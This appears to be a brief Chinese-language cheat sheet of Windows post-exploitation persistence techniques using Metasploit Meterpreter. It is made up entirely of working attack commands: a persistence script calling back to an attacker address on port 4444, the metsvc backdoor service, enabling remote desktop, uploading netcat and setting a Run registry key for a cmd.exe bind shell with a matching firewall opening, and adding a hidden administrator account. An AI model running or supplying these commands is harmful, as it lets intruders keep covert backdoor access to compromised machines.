

### 通过persistence脚本

```
 run persistence -X -i 5 -p 4444 -r 192.168.1.110
```

### 通过metsvc服务

`run metsvc`

### 通过开启远程桌面

`run getgui -u metasploit -p meterpreter`

### 通过nc

```
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v
nc  -d 'c:\windows\system32\nc.exe -Ldp 455 -e cmd.exe'
netsh firewall add portopening TCP 455 "Service Firewall"  ENABLE ALL
```

### 创建隐藏用户

```
net user test 123456 /add
net localgroup administrators test /add
```

